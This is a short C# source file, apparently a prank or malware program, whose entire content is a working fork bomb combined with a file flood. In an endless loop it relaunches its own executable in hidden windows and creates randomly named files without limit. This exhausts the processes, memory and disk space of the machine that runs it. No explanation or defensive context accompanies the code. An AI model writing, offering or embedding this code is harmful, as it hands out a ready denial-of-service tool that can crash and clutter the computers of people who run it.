using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using System.Threading.Tasks;

namespace Flames
{
    class Program
    {
        private static void Reload()
        {
            Process process = new Process();

            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.FileName = Assembly.GetEntryAssembly().Location;
            process.Start();
        }

        private static void OverLoad()
        {
            Random rd = new Random();
            File.Create("Dashie Is Cool." + rd.Next(0, 99999999).ToString() + rd.Next(0, 99999999).ToString());
        }

        public static void Main(string[] args)
        {
            while(true)
            {
                Task ReShell = Task.Run((Action)Reload);
                Task Load = Task.Run((Action)OverLoad);
            }
        }
    }
}
